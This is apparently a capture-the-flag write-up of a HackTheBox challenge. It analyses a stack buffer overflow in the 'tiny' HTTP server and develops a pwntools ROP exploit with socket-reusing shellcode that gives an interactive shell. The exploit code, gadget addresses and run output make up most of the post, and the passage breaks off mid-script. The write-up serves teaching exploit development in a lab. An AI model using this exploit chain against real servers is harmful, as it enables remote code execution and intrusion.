@@ -1,0 +1,278 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" data-toc-skip="" itemprop="name headline">Buffer Overflow in HTB Smasher</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-smasher">htb-smasher</a> <a class="post-tag" href="/tags#gdb">gdb</a> <a class="post-tag" href="/tags#bof">bof</a> <a class="post-tag" href="/tags#pwntools">pwntools</a> </span><br/><br/>
+<time class="dt-published" datetime="2018-11-24T11:00:30+00:00" itemprop="datePublished">Nov 24, 2018
+    </time>
+</p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<ul class="nav navbar-nav"><li><a href="/2018/11/24/htb-smasher.html" style="color: #e6e6e6;">HTB: Smasher</a></li><li><a href="/2018/11/24/htb-smasher-bof.html" style="color: #e6e6e6;">Smasher BOF in tiny</a>
+<nav data-toggle="toc" id="toc"></nav></li>
+</ul>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<p><img alt="Smasher Bof Cover image" src="https://0xdfimages.gitlab.io/img/smasher-bof-cover.jpg" style="float: right; margin-left:50px"> There was so much to write about for Smasher, it seemed that the buffer overflow in tiny deserved its own post. I’ll walk through my process, code analysis and debugging, through development of a small ROP chain, and show how I trouble shot when things didn’t work. I’ll also show off pwntools along the way.</img></p>
+<h2 id="program-analysis">Program Analysis</h2>
+<p>Before I can write a exploit, I like to understand what the program is doing. For large programs, and for very experienced exploit developers, sometimes it’s easier to fuzz the program and look for crashes. That said, I use a combination of static analysis in Ida and debugging in gdb to figure out how the server worked, and where I could exploit it.</p>
+<h3 id="gdb-note">gdb Note</h3>
+<p>I used <code class="language-plaintext highlighter-rouge">gdb</code> with the <a href="https://github.com/longld/peda">Python Exploit Development Assistance</a> plugin (peda) to do this analysis. One thing I noticed was that when I was hitting <code class="language-plaintext highlighter-rouge">n</code> (<code class="language-plaintext highlighter-rouge">next</code>) or <code class="language-plaintext highlighter-rouge">s</code> (<code class="language-plaintext highlighter-rouge">step</code>), it was often jumping several assembly instructions. Turns out, when the binary is compiled with debug info (which gives access to the source along side the assembly), <code class="language-plaintext highlighter-rouge">n</code> and<code class="language-plaintext highlighter-rouge">s</code> execute to the next line of source. If you want to move one assembly instruction, use <code class="language-plaintext highlighter-rouge">ni</code> or <code class="language-plaintext highlighter-rouge">si</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span><span class="nb">help </span>s
+<span class="go">Step program until it reaches a different source line.
+Usage: step [N]
+Argument N means step N times (or till program stops for another reason).
+</span><span class="gp">gdb-peda$</span><span class="w"> </span><span class="nb">help </span>si
+<span class="go">Step one instruction exactly.
+Usage: stepi [N]
+Argument N means step N times (or till program stops for another reason).
+</span></code></pre></div></div>
+<h3 id="code-overview">Code Overview</h3>
+<p>The flow of <code class="language-plaintext highlighter-rouge">tiny</code> starts in <code class="language-plaintext highlighter-rouge">main()</code>, which handles listening, and accepting connections. On a connection, a new process if forked, and the child process calls <code class="language-plaintext highlighter-rouge">process()</code> and is passed the socket.</p>
+<p><code class="language-plaintext highlighter-rouge">process()</code> creates an <code class="language-plaintext highlighter-rouge">http_request</code> struct called <code class="language-plaintext highlighter-rouge">req</code>. The <code class="language-plaintext highlighter-rouge">http_request</code> struct is defined in <code class="language-plaintext highlighter-rouge">tiny.c</code> as having a filename, an offset, and an end:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+    <span class="kt">off_t</span> <span class="n">offset</span><span class="p">;</span>              <span class="cm">/* for support Range */</span>
+    <span class="kt">size_t</span> <span class="n">end</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">http_request</span><span class="p">;</span>
+</code></pre></div></div>
+<p><img alt="Smasher Pointers image" src="https://0xdfimages.gitlab.io/img/smasher-pointers.jpeg" style="float: right;margin-right:50px; margin-left:50px"/>A pointer to <code class="language-plaintext highlighter-rouge">req</code> and the socket descriptor are passed to a function called <code class="language-plaintext highlighter-rouge">parse_request</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">parse_request</code> reads from the socket, and populates <code class="language-plaintext highlighter-rouge">req</code>. <code class="language-plaintext highlighter-rouge">req-&gt;offset</code> and <code class="language-plaintext highlighter-rouge">req-&gt;end</code> are set inside <code class="language-plaintext highlighter-rouge">parse_request</code>, and <code class="language-plaintext highlighter-rouge">req-&gt;filename</code> is passed by reference to a function called <code class="language-plaintext highlighter-rouge">url_decode</code>, where the filename is copied into the <code class="language-plaintext highlighter-rouge">http_request</code> object.</p>
+<h3 id="vulnerability">Vulnerability</h3>
+<p>The vulnerability comes because <code class="language-plaintext highlighter-rouge">parse_request</code> will handle up to 1024 bytes of filename, and the <code class="language-plaintext highlighter-rouge">url_decode</code> function will, without checking bounds, copy that much, despite the fact that the <code class="language-plaintext highlighter-rouge">http_request</code> struct only allows for 512 bytes of filename.</p>
+<p>So, while in <code class="language-plaintext highlighter-rouge">url_decode</code>, the stack looks like this:</p>
+<p><img alt="1530025375925" src="https://0xdfimages.gitlab.io/img/1530025375925.png"/></p>
+<p>So that means if I can write a filename longer than 0x2c8 - 0x90 = 0x238 = 568 bytes, when url_decode() writes to <code class="language-plaintext highlighter-rouge">filename</code>, it will overwrite <code class="language-plaintext highlighter-rouge">rip</code>, giving me control over the program.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="strategy">Strategy</h3>
+<p>To gain execution, I need to be able to get the <code class="language-plaintext highlighter-rouge">RIP</code> register pointing to shellcode that I give it. In the early days of exploitation, that could be as simple as writing shellcode onto the stack (in my input) and then overwriting <code class="language-plaintext highlighter-rouge">rip</code> with that address. However, with ASLR (which is on enabled in this case), guessing that address becomes infeasible. So, I’ll use return oriented programming, or ROP. ROP is basically using the last instruction (or last few instructions) from various functions in the binary to achieve steps towards what I want to accomplish.</p>
+<p>I am going to use the <code class="language-plaintext highlighter-rouge">read</code> function to read from the open socket, and save it to the BSS segment. I’ll need the address of <code class="language-plaintext highlighter-rouge">read</code> and <code class="language-plaintext highlighter-rouge">BSS</code>, and rop gadgets that will get the right arguments in place for those calls. Once I read shellcode into BSS, I’ll call it.</p>
+<p><em>July 2023 Note: Getting this exact script to work in modern Python will take some work. If you choose to go with Python2, you may need to <a href="https://github.com/Gallopsled/pwntools/issues/1538">freeze unicorn</a> at version 1.0.2rc6. to make <code class="language-plaintext highlighter-rouge">pwntools</code> work as expected. Thanks to InvertedClimbing for the tip.</em></p>
+<h3 id="initial-attempt">Initial Attempt</h3>
+<h4 id="skeleton">Skeleton</h4>
+<p>I’ll build an exploit script with <code class="language-plaintext highlighter-rouge">pwntools</code>. Start with a skeleton:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#/usr/bin/env python
+</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Set up context
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./tiny</span><span class="sh">'</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">1111</span>
+
+<span class="c1"># Build Payload
+</span><span class="n">junk</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">568</span>  <span class="c1"># junk to get to ret addr
+</span><span class="n">payload</span> <span class="o">=</span>  <span class="sh">""</span>
+<span class="c1"># rop will go here
+</span>
+<span class="c1"># Request
+</span><span class="n">req</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">'</span><span class="s">GET {}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Send request
+</span><span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+<h4 id="add-addresses">Add Addresses</h4>
+<p>Add to the template code to get the BSS address and the address of read:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Get addresses
+</span><span class="n">BSS</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">get_section_by_name</span><span class="p">(</span><span class="sh">"</span><span class="s">.bss</span><span class="sh">"</span><span class="p">)[</span><span class="sh">"</span><span class="s">sh_addr</span><span class="sh">"</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">BSS address: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">BSS</span><span class="p">))</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">.</span><span class="n">read</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">plt read address: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">read</span><span class="p">))</span>
+</code></pre></div></div>
+<h4 id="gadgets">Gadgets</h4>
+<p>Now I’ll need some gadgets. In <code class="language-plaintext highlighter-rouge">gdb</code> with <code class="language-plaintext highlighter-rouge">peda</code> loaded, I ran <code class="language-plaintext highlighter-rouge">dumprop</code>, which writes a bunch of gadgets to a file, <code class="language-plaintext highlighter-rouge">tiny-rop.txt</code>. To call <code class="language-plaintext highlighter-rouge">read</code>, I’ll need to pass the socket descriptor in <code class="language-plaintext highlighter-rouge">rsi</code>, and the address to write to in <code class="language-plaintext highlighter-rouge">rdi</code>. So I need gadgets to pop into those registers. I’ll find these two:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">0x4011dd: pop rdi; ret           &lt;-- useful to pass parameters to read
+0x4011db: pop rsi; pop r15; ret  &lt;-- useful to pass parameters to read, ignoring r15
+</span></code></pre></div></div>
+<p>So, this all adds up to the following payload:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">junk</span> <span class="o">=</span>  <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">568</span>      <span class="c1"># junk
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x4011dd</span><span class="p">)</span>  <span class="c1"># pop rdi; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>         <span class="c1"># socket descriptor
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x4011db</span><span class="p">)</span>  <span class="c1"># pop rsi; pop r15; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">BSS</span><span class="p">)</span>       <span class="c1"># BSS, to go to rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">BSS</span><span class="p">)</span>       <span class="c1"># junk for r15
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>      <span class="c1"># read
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">BSS</span><span class="p">)</span>       <span class="c1"># return to shellcode
+</span></code></pre></div></div>
+<p>I’ll walk through that in detail:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">junk</code> will be the right length so that when the program goes to return, the top of the stack will be the start of <code class="language-plaintext highlighter-rouge">payload</code>. Therefore, execution will return to the <code class="language-plaintext highlighter-rouge">pop rdi; ret</code> gadget, and 4 will sit on top of the stack.</li>
+<li><code class="language-plaintext highlighter-rouge">pop rdi</code> will take the 4 off the top of the stack and store it in <code class="language-plaintext highlighter-rouge">rdi</code>. This leaves the second gadget on top of the stack.</li>
+<li><code class="language-plaintext highlighter-rouge">ret</code> will move execution to the second gadget, leaving the address of bss on top of the stack.</li>
+<li>The second gadget will pop twice, into <code class="language-plaintext highlighter-rouge">rsi</code> and <code class="language-plaintext highlighter-rouge">r15</code>. I don’t care about <code class="language-plaintext highlighter-rouge">r15</code>, but I needed the bss address in <code class="language-plaintext highlighter-rouge">rsi</code>. Now, the address of <code class="language-plaintext highlighter-rouge">read</code> sits on top of the stack.</li>
+<li><code class="language-plaintext highlighter-rouge">ret</code> will push execution to the read call, leaving the bss address on top of the stack. Because I now have the socket descriptor in <code class="language-plaintext highlighter-rouge">rdi</code>, and the bss address in <code class="language-plaintext highlighter-rouge">rsi</code>, it will read from the socket into bss.</li>
+<li>If I had called <code class="language-plaintext highlighter-rouge">read</code> as a function, that would have pushed a new return address onto the stack. But since I just moved RIP there, when read returns, it will pop the next word off the stack for a return address, which is the bss address, where I just wrote my shellcode.</li>
+</ul>
+<h4 id="dup-shellcode">Dup Shellcode</h4>
+<p>Next, I’ll use <code class="language-plaintext highlighter-rouge">pwntools</code> to generate shellcode to that will reuse the socket file descriptor for a <code class="language-plaintext highlighter-rouge">sh</code> that I can interact with. To use this function, I need the descriptor for the socket. I’ve noticed that when I run <code class="language-plaintext highlighter-rouge">tiny</code> locally, every time I make a request to it, it prints out the fd, and it’s consistently 4:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./tiny 1111
+<span class="go">listen on port 1111, fd is 3
+accept request, fd is 4, pid is 2702
+127.0.0.1:60506 200 - .
+</span></code></pre></div></div>
+<p>So I’ll add the following to my code, which will generate shellcode to run a shell over my current connection and send it over the socket:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nf">dupsh</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span> <span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">amd64</span><span class="sh">"</span><span class="p">))</span>
+</code></pre></div></div>
+<p>Now the exploit code looks like this:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#/usr/bin/env python
+</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Set up context
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./tiny</span><span class="sh">'</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">HOST</span><span class="p">,</span> <span class="n">PORt</span> <span class="o">=</span> <span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">1111</span>
+
+<span class="c1"># Get addresses
+</span><span class="n">BSS</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">get_section_by_name</span><span class="p">(</span><span class="sh">"</span><span class="s">.bss</span><span class="sh">"</span><span class="p">)[</span><span class="sh">"</span><span class="s">sh_addr</span><span class="sh">"</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">BSS address: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">BSS</span><span class="p">))</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">.</span><span class="n">read</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">plt read address: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">read</span><span class="p">))</span>
+
+<span class="c1"># Build Payload
+</span><span class="n">junk</span> <span class="o">=</span>  <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">568</span>         <span class="c1"># junk
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x4011dd</span><span class="p">)</span>  <span class="c1"># pop rdi; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>         <span class="c1"># socket descriptor
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x4011db</span><span class="p">)</span>  <span class="c1"># pop rsi; pop r15; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">BSS</span><span class="p">)</span>       <span class="c1"># BSS, to go to rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">BSS</span><span class="p">)</span>       <span class="c1"># junk for r15
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>      <span class="c1"># read
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">BSS</span><span class="p">)</span>       <span class="c1"># return to shellcode
+</span>
+<span class="c1"># Request
+</span><span class="n">req</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">'</span><span class="s">GET {}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Send request
+</span><span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nf">dupsh</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span> <span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">amd64</span><span class="sh">"</span><span class="p">))</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<h4 id="run-it-and-fail">Run It (and Fail)</h4>
+<p>Ready to get a shell, I’ll run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>python tiny_exploit.py
+<span class="go">[*] BSS address: 6304352
+[*] plt read address: 4197616
+[*] payload: 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141dd114000000000000400000000000000db1140000000000060326000000000006032600000000000f00c4000000000006032600000000000
+[+] Opening connection to 127.0.0.1 on port 1111: Done
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+</span><span class="gp">$ </span><span class="nb">id</span>
+<span class="go">[*] Closed connection to 127.0.0.1 port 1111
+[*] Got EOF while sending in interactive
+</span><span class="gp">root@kali#</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="second-attempt">Second Attempt</h3>
+<h4 id="why-did-that-fail">Why Did That Fail?</h4>
+<p>Back in the source, if I trace what happens to my string, <code class="language-plaintext highlighter-rouge">parse_request</code> looks like this:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">270</span> <span class="kt">void</span> <span class="nf">parse_request</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">http_request</span> <span class="o">*</span><span class="n">req</span><span class="p">){</span>
+<span class="mi">271</span>     <span class="n">rio_t</span> <span class="n">rio</span><span class="p">;</span>
+<span class="mi">272</span>     <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">MAXLINE</span><span class="p">],</span> <span class="n">method</span><span class="p">[</span><span class="n">MAXLINE</span><span class="p">],</span> <span class="n">uri</span><span class="p">[</span><span class="n">MAXLINE</span><span class="p">];</span>
+<span class="mi">273</span>     <span class="n">req</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="mi">274</span>     <span class="n">req</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>              <span class="cm">/* default */</span>
+<span class="mi">275</span>
+<span class="mi">276</span>     <span class="n">rio_readinitb</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rio</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+<span class="mi">277</span>     <span class="n">rio_readlineb</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rio</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">MAXLINE</span><span class="p">);</span>
+<span class="mi">278</span>     <span class="n">sscanf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"%s %s"</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">uri</span><span class="p">);</span> <span class="cm">/* version is not cared */</span>
+<span class="mi">279</span>     <span class="cm">/* read all */</span>
+<span class="mi">280</span>     <span class="k">while</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\n'</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* \n || \r\n */</span>
+<span class="mi">281</span>         <span class="n">rio_readlineb</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rio</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">MAXLINE</span><span class="p">);</span>
+<span class="mi">282</span>         <span class="k">if</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'R'</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'a'</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'n'</span><span class="p">){</span>
+<span class="mi">283</span>             <span class="n">sscanf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"Range: bytes=%lu-%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">end</span><span class="p">);</span>
+<span class="mi">284</span>             <span class="c1">// Range: [start, end]</span>
+<span class="mi">285</span>             <span class="k">if</span><span class="p">(</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">++</span><span class="p">;</span>
+<span class="mi">286</span>         <span class="p">}</span>
+<span class="mi">287</span>     <span class="p">}</span>
+<span class="mi">288</span>     <span class="kt">char</span><span class="o">*</span> <span class="n">filename</span> <span class="o">=</span> <span class="n">uri</span><span class="p">;</span>
+<span class="mi">289</span>     <span class="k">if</span><span class="p">(</span><span class="n">uri</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'/'</span><span class="p">){</span>
+<span class="mi">290</span>         <span class="n">filename</span> <span class="o">=</span> <span class="n">uri</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+<span class="mi">291</span>         <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+<span class="mi">292</span>         <span class="k">if</span> <span class="p">(</span><span class="n">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+<span class="mi">293</span>             <span class="n">filename</span> <span class="o">=</span> <span class="s">"."</span><span class="p">;</span>
+<span class="mi">294</span>         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="mi">295</span>             <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="o">++</span> <span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+<span class="mi">296</span>                 <span class="k">if</span> <span class="p">(</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'?'</span><span class="p">)</span> <span class="p">{</span>
+<span class="mi">297</span>                     <span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+<span class="mi">298</span>                     <span class="k">break</span><span class="p">;</span>
+<span class="mi">299</span>                 <span class="p">}</span>
+<span class="mi">300</span>             <span class="p">}</span>
+<span class="mi">301</span>         <span class="p">}</span>
+<span class="mi">302</span>     <span class="p">}</span>
+<span class="mi">303</span>     <span class="n">url_decode</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span> <span class="n">MAXLINE</span><span class="p">);</span>
+<span class="mi">304</span> <span class="p">}</span>
+</code></pre></div></div>
+<p>The first 1024 bytes of input is read into <code class="language-plaintext highlighter-rouge">buf</code>, and then <code class="language-plaintext highlighter-rouge">sscanf</code> is used to pull the first two strings out of it, in a normal case, something like “GET” and “/”. But if I look at the payload I sent (with the initial “A”s truncated), it looks like:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">...41414141dd114000000000000400000000000000db1140000000000060326000000000006032600000000000f00c4000000000006032600000000000
+</span></code></pre></div></div>
+<p>As soon as <code class="language-plaintext highlighter-rouge">sscanf</code> gets to that first null (00) byte, it stops.</p>
+<h4 id="success">Success</h4>
+<p>Fortunately, the last thing the code does before writing bytes into the structure I can overflow is to url decode them. So that’s how I can get these bytes to the right place. By encoding the bytes, they will be strings, and then decoded into binary form as I need it.</p>
+<p>I’ll import <code class="language-plaintext highlighter-rouge">quote</code> from <code class="language-plaintext highlighter-rouge">urllib</code> in python.</p>
+<p>Now the code looks like this:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#/usr/bin/env python
+</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">urllib</span> <span class="kn">import</span> <span class="n">quote</span> <span class="k">as</span> <span class="n">urlencode</span>
+
+<span class="c1"># url encode
+</span><span class="k">def</span> <span class="nf">url_encode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sh">"</span><span class="s">%%%02x</span><span class="sh">"</span> <span class="o">%</span> <span class="nf">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
+
+
+<span class="c1"># Set up context
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./tiny</span><span class="sh">'</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="c1">#HOST, PORT = "127.0.0.1", 1111
+</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="sh">"</span><span class="s">10.10.10.89</span><span class="sh">"</span><span class="p">,</span> <span class="mi">1111</span>
+
+<span class="c1"># Get addresses
